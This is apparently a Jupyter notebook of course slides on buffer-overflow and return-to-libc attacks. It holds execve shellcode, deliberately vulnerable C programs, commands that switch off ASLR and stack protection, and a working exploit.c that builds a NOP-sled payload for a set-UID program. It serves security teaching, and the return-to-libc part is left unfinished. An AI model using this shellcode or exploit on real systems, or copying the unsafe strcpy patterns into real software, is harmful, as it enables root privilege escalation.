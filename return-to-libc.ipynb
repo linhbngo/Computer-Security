{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## <center> Return-to-libc Attack </center>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "### Stack-based Buffer Overflow Attack\n",
    "\n",
    "- Malicious data are used to overflow a function'return address in order to get the program to *jump* to a different location on the stack which stores malicious code. \n",
    "- This can be countered by making the stack non-executable"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [],
   "source": [
    "%%writefile source/shellcode.c\n",
    "#include <string.h>\n",
    "\n",
    "const char code[] =\n",
    "  \"\\x31\\xc0\\x50\\x68//sh\\x68/bin\"\n",
    "  \"\\x89\\xe3\\x50\\x53\\x89\\xe1\\x99\"\n",
    "  \"\\xb0\\x0b\\xcd\\x80\";\n",
    "\n",
    "int main(int argc, char **argv)\n",
    "{\n",
    "   char buffer[sizeof(code)];\n",
    "   strcpy(buffer, code);\n",
    "   ((void(*)( ))buffer)( );\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "In a terminal, run the following commands:\n",
    "\n",
    "```\n",
    "$ gcc -z execstack -o shellcode Computer-Security/source/shellcode.c\n",
    "$ ./shellcode\n",
    "$ gcc -z noexecstack shellcode Computer-Security/source/shellcode.c\n",
    "$ ./shellcode\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "- Good countermeasure, but not enough.\n",
    "- If the stack is not executable, an alternative solution is to make the program jump to where there are executable codes.\n",
    "- Enter the region for standard C library on Linux, called **libc**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "<center> <img src=\"figure/return-to-libc/libc1.jpg\" width=\"700\"/>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Overwriting source/mem_layout.c\n"
     ]
    }
   ],
   "source": [
    "%%writefile source/stack.c\n",
    "#include <stdlib.h>\n",
    "#include <stdio.h>\n",
    "#include <string.h>\n",
    "\n",
    "int vul_func(char *str)\n",
    "{\n",
    "    char buffer[50];\n",
    "\n",
    "    /* The following statement has a buffer overflow problem */\n",
    "    strcpy(buffer, str);    \n",
    "\n",
    "    return 1;\n",
    "}\n",
    "\n",
    "int main(int argc, char **argv)\n",
    "{\n",
    "    char str[240];\n",
    "    FILE *badfile;\n",
    "\n",
    "    badfile = fopen(\"badfile\", \"r\");\n",
    "    fread(str, sizeof(char), 200, badfile);\n",
    "    vul_func(str);\n",
    "\n",
    "    printf(\"Returned Properly\\n\");\n",
    "    return 1;\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Run the followings:\n",
    "\n",
    "```\n",
    "$ gcc -fno-stack-protector -z noexecstack -o stack Computer-Security/source/stack.c\n",
    "$ sudo sysctl -w kernel.randomize_va_space=0\n",
    "```\n",
    "- `-fno-stack-protector`: disable protection against changes in stack\n",
    "- `-z noexecstack`: actually turn on protection against executable stack\n",
    "- `kernel.randomize_va_space=0`: disable address space layout randomization\n",
    "\n",
    "Afterward, turn the programinto a root-owned set-UID program\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "### Launch the Return-to-libc Attack\n",
    "\n",
    "- Task A: find where in memory is `system()` located\n",
    "- Task B: find the address of the `/bin/sh` string\n",
    "- Task C: where to place the address of `/bin/sh` in the stack so that `system()` can get to it"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "#### Task A: Find the address of the system() function\n",
    "\n",
    "Anytime a program runs, the libc library will be loaded into memory. Using `gdb`, we can find out the location of `system()`with the following commands:\n",
    "\n",
    "```\n",
    "$ gdb stack\n",
    "(gdb-peda)$ run\n",
    "(gdb-peda)$ p system\n",
    "(gdb-peda)$ p exit\n",
    "(gdb-peda)$ quit\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "#### Exercise:\n",
    "\n",
    "Rerun the above process with a different program (pick one from our previous lectures) to confirm that the locations of `system` and `exit` do not change. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "#### Task B: Find the Address of the String \"/bin/sh\"\n",
    "\n",
    "- We want `system()` to execute `/bin/sh`\n",
    "- Therefore, `/bin/sh` must be in memory, and its address should be passed to `system()` as an argument. \n",
    "  - We cannot embed this in the source code (no access to source code of vulnerable program)\n",
    "- Solution:\n",
    "  - Utilize environment variables\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Overwriting source/mem_layout_print.c\n"
     ]
    }
   ],
   "source": [
    "%%writefile source/find_myshell.c\n",
    "#include <stdio.h>\n",
    "\n",
    "int main()\n",
    "{\n",
    "  char *shell = (char *) getenv(\"MYSHELL\");\n",
    "  if (shell) {\n",
    "    printf (\"Value: %s\\n\", shell);\n",
    "    printf (\"Address: %x\\n\", (unsigned int)shell); \n",
    "  }\n",
    "  return 1;\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Run the followings:\n",
    "\n",
    "```\n",
    "$ gcc -o find_myshell55 Computer-Security/source/find_myshell.c\n",
    "$ export MYSHELL=\"/bin/sh\"\n",
    "$ ./find_myshell55\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Recompile find_myshell.c to a file named `myshell77`. Rerun the program. Is the address for `/bin/sh` still the same? Why?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "<center> <img src=\"figure/buffer-overflow/bo2.png\" width=\"400\"/>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Overwriting source/stack_trace.c\n"
     ]
    }
   ],
   "source": [
    "%%writefile source/stack_trace.c\n",
    "#include<stdio.h>\n",
    "static void display(int i, int *ptr);\n",
    "    \n",
    "int main(void) {\n",
    " int x = 5;\n",
    " int *xptr = &x;\n",
    " printf(\"In main():\\n\");\n",
    " printf(\"   x is %d and is stored at %p.\\n\", x, &x);\n",
    " printf(\"   xptr points to %p which holds %d.\\n\", xptr, *xptr);\n",
    " display(x, xptr);\n",
    " printf (\"The display function has stopped\");\n",
    " return 0;\n",
    "}\n",
    "   \n",
    "void display(int z, int *zptr) {\n",
    "  printf(\"In display():\\n\");\n",
    "  printf(\"   z is %d and is stored at %p.\\n\", z, &z);\n",
    "  printf(\"   zptr points to %p which holds %d.\\n\", zptr, *zptr);\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Run the followings:\n",
    "\n",
    "```\n",
    "$ gcc -g -o stack_trace Computer-Security/source/stack_trace.c\n",
    "$ ./stack_trace\n",
    "$ gdb stack_trace\n",
    "gdb-peda$ \n",
    "```\n",
    "\n",
    "In Class: Alternate between `run`, `break 10`, `backtrace`, `step`, and `n` to see how stack grows. `quit` to quit `gdb`."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "```\n",
    "gdb-peda$ run\n",
    "gdb-peda$ break 10\n",
    "gdb-peda$ run\n",
    "gdb-peda$ backtrace\n",
    "gdb-peda$ step\n",
    "gdb-peda$ backtrace\n",
    "gdb-peda$ n\n",
    "gdb-peda$ n\n",
    "gdb-peda$ n\n",
    "gdb-peda$ backtrace\n",
    "gdb-peda$ n\n",
    "gdb-peda$ backtrace\n",
    "gdb-peda$ n\n",
    "gdb-peda$ backtrace\n",
    "gdb-peda$ n\n",
    "gdb-peda$ n\n",
    "gdb-peda$ backtrace\n",
    "```\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "<center> <img src=\"figure/buffer-overflow/bo3.png\" width=\"400\"/>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "### Buffer Overflow Attack\n",
    "\n",
    "- Memory copy happens in programming when data from one place (source) is duplicated to another place (destination). \n",
    "- Before copying can happen, memory needs to be allocated at the destination. \n",
    "- If the allocation fails to be sufficient, it will result in an overflow. \n",
    "- One of the oldest and most well-known attacks."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "#### Why do we need to learn this vulnerability and attack?\n",
    "\n",
    "- Can still be found buried in legacy or glue code from third party libraries as web sites get more complex and evolved.\n",
    "- An important point of learning as you work through the theory and practice of this exploit:\n",
    "  - C programming\n",
    "  - C Assembler\n",
    "  - Linux debugger using gdb\n",
    "  - Engage in mathematics to understand the breaking points and the hex contents in memory in order to place an attack\n",
    "\n",
    "**[Smashing the Stack, 2016](https://www.aap3recruitment.com/news/smashing-the-stack/14074/)**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "**strcpy()**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Overwriting source/test_strcpy.c\n"
     ]
    }
   ],
   "source": [
    "%%writefile source/test_strcpy.c\n",
    "#include <string.h>\n",
    "#include <stdio.h>\n",
    "void main(){\n",
    "  char src[40] = \"Hello World \\0 Extra string\";\n",
    "  char dest[40];\n",
    "  strcpy(dest, src);\n",
    "  printf(\"%s\",dest);\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Compile and run `test_strcpy` in your terminal.\n",
    "- What happens? Why is the string not copied properly?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Overwriting source/strcpy_overflow.c\n"
     ]
    }
   ],
   "source": [
    "%%writefile source/strcpy_overflow.c\n",
    "#include <string.h>\n",
    "\n",
    "void foo(char *str)\n",
    "{\n",
    "    char buffer[12];\n",
    "\n",
    "    /* The following statement will result in buffer overflow */ \n",
    "    strcpy(buffer, str);\n",
    "}\n",
    "\n",
    "int main()\n",
    "{\n",
    "    char *str = \"This is definitely longer than 12\";    \n",
    "    foo(str);\n",
    "\n",
    "    return 1;\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Run the followings:\n",
    "```\n",
    "$ gcc -o strcpy_overflow Computer-Security/source/strcpy_overflow.c\n",
    "$ ./strcpy_overflow\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Run the followings:\n",
    "```\n",
    "$ gcc -z execstack -fno-stack-protector -o strcpy_overflow Computer-Security/source/strcpy_overflow.c\n",
    "$ ./strcpy_overflow\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Run the gdb debugging sequence. Examing the frames at each backtrace. What happens to the last backtrace?\n",
    "```\n",
    "gdb-peda$ break 14\n",
    "gdb-peda$ run\n",
    "gdb-peda$ backtrace\n",
    "gdb-peda$ step\n",
    "gdb-peda$ backtrace\n",
    "gdb-peda$ n\n",
    "gdb-peda$ backtrace\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "<center> <img src=\"figure/buffer-overflow/bo4.png\" width=\"400\"/>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "- The region above the buffer includes critical values, including the return address and the previous frame pointer. \n",
    "- The consequences of a modified return address (due to buffer overflow) include:\n",
    "  - The new address (virtual address) might not be mapped to any physical address, leading to an invalid return instruction and a crashed program. \n",
    "  - The address might be mapped to a physical address in protected system space, leading to a failed jump and a crashed program. \n",
    "  - The address might be mapped to a physical address that does not contain any valid instruction, leading to a failed return and a crashed program. \n",
    "  - **The address might be mapped to a physical address that happens to contain valid machine instructions, leading to a continuing program with logic different from the original program.**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "#### Exploiting a Buffer Overflow Vulnerability\n",
    "\n",
    "- By overflowing a buffer, we can cause the program to crash or run something else. \n",
    "- If the program is privileged, this means *something else* will be run with privilige, leading to potential privilege escalation for *something malicious*. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Overwriting source/stack.c\n"
     ]
    }
   ],
   "source": [
    "%%writefile source/stack.c\n",
    "/* stack.c */\n",
    "/* This program has a buffer overflow vulnerability. */\n",
    "\n",
    "#include <stdlib.h>\n",
    "#include <stdio.h>\n",
    "#include <string.h>\n",
    "\n",
    "int foo(char *str)\n",
    "{\n",
    "    char buffer[100];\n",
    "    printf (\"I am here\");\n",
    "    /* The following statement has a buffer overflow problem */ \n",
    "    strcpy(buffer, str);\n",
    "\n",
    "    return 1;\n",
    "}\n",
    "\n",
    "int main(int argc, char **argv)\n",
    "{\n",
    "    char str[400];\n",
    "    FILE *badfile;\n",
    "\n",
    "    badfile = fopen(\"badfile\", \"r\");\n",
    "    fread(str, sizeof(char), 300, badfile);\n",
    "    foo(str);\n",
    "\n",
    "    printf(\"Returned Properly\\n\");\n",
    "    return 1;\n",
    "}\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "- Clearly, there is a buffer overflow issue.\n",
    "- What needs to be store in `badfile` to expoit this issue?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "<center> <img src=\"figure/buffer-overflow/bo5.png\" width=\"500\"/>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Disable countermeasures:\n",
    "```\n",
    "$ sudo sysctl -w kernel.randomize_va_space=0\n",
    "```\n",
    "Include the following flags with your gcc:\n",
    "- `-z execstack`\n",
    "- `-fno-stack-protector`"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Run the followings:\n",
    "```\n",
    "$ gcc -o stack -z execstack -fno-stack-protector Computer-Security/source/stack.c\n",
    "$ sudo chown root stack\n",
    "$ sudo chmod 4755 stack\n",
    "$ echo \"aaaa\" > badfile\n",
    "$ ./stack\n",
    "$ echo \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\" > badfile\n",
    "$ ./stack\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "How do we know (guess) where the stack frame of `foo()` will be for us to find out where the malicious code is located (and hence set the relevant jump address)?\n",
    "- Fixed starting address of the stack (before countermeasure). \n",
    "- The stack is shallow (good programming practice don't use deeply nested functions). "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Disable the address randomization and then run `mem_layout_print` to see if the addresses for the pointers in stack are changed?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "<center> <img src=\"figure/buffer-overflow/bo6.png\" width=\"500\"/>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "How can we find the return address without guessing?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Run the followings:\n",
    "```\n",
    "$ gcc -g -o stack_dbg -z execstack -fno-stack-protector Computer-Security/source/stack.c\n",
    "$ rm badfile\n",
    "$ touch badfile\n",
    "$ gdb stack_dbg\n",
    "gdb-peda$ break foo\n",
    "gdb-peda$ run\n",
    "gdb-peda$ print $ebp\n",
    "gdb-peda$ print &buffer\n",
    "gdb-peda$ print ebp - buffer\n",
    "gdb-peda$ quit\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "- What is 0x6C in decimal?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "<center> <img src=\"figure/buffer-overflow/bo7.png\" width=\"500\"/>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "The next body of code will need to be modified anytime you retest this program, after going through the debugging process to identify the correct stack position."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Overwriting source/exploit.c\n"
     ]
    }
   ],
   "source": [
    "%%writefile source/exploit.c\n",
    "/* exploit.c  */\n",
    "\n",
    "#include <stdlib.h>\n",
    "#include <stdio.h>\n",
    "#include <string.h>\n",
    "char shellcode[]=\n",
    "    \"\\x31\\xc0\"             /* xorl    %eax,%eax     */\n",
    "    \"\\x50\"                 /* pushl   %eax          */\n",
    "    \"\\x68\"\"//sh\"           /* pushl   $0x68732f2f   */\n",
    "    \"\\x68\"\"/bin\"           /* pushl   $0x6e69622f   */\n",
    "    \"\\x89\\xe3\"             /* movl    %esp,%ebx     */\n",
    "    \"\\x50\"                 /* pushl   %eax          */\n",
    "    \"\\x53\"                 /* pushl   %ebx          */\n",
    "    \"\\x89\\xe1\"             /* movl    %esp,%ecx     */\n",
    "    \"\\x99\"                 /* cdq                   */\n",
    "    \"\\xb0\\x0b\"             /* movb    $0x0b,%al     */\n",
    "    \"\\xcd\\x80\"             /* int     $0x80         */\n",
    ";\n",
    "\n",
    "void main(int argc, char **argv)\n",
    "{\n",
    "  char buffer[200];\n",
    "  FILE *badfile;\n",
    "\n",
    "  /* A. Initialize buffer with 0x90 (NOP instruction) */\n",
    "  memset(&buffer, 0x90, 200);\n",
    "\n",
    "  /* B. Fill the return address field with a candidate \n",
    "        entry point of the malicious code - This needs to be changed everytime you run the vulnerable program. \n",
    "        If this does not work, change x80 to a different value and try again. \n",
    "    \n",
    "    */\n",
    "  *((long *) (buffer + 112)) = 0xbfffe968 + 0x16;\n",
    "\t\n",
    "  // C. Place the shellcode towards the end of buffer\n",
    "  memcpy(buffer + sizeof(buffer) - sizeof(shellcode), shellcode, \n",
    "         sizeof(shellcode));\n",
    "\n",
    "  /* Save the contents to the file \"badfile\" */\n",
    "  badfile = fopen(\"./badfile\", \"w\");\n",
    "  fwrite(buffer, 200, 1, badfile);\n",
    "  fclose(badfile);\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Run the followings (after modify exploit.c accordingly)\n",
    "```\n",
    "$ rm badfile\n",
    "$ gcc -o exploit Computer-Security/source/exploit.c\n",
    "$ ./exploit\n",
    "$ ./stack\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "### Countermeasures"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "#### General approaches\n",
    "\n",
    "- Safer functions: specification of maximum data length to be copied\n",
    "- Safer dynamic link library: dynamic link to safer libraries (as opposed to calling unsafe functions)\n",
    "- Program static analyzer: warn of code patterns that could lead to buffer overflow\n",
    "- Programming language: self-check against buffer overflow in the language\n",
    "- Compiler: -fno-stack-protector\n",
    "- Operating system: kernel.randomize_va_space"
   ]
  }
 ],
 "metadata": {
  "celltoolbar": "Slideshow",
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
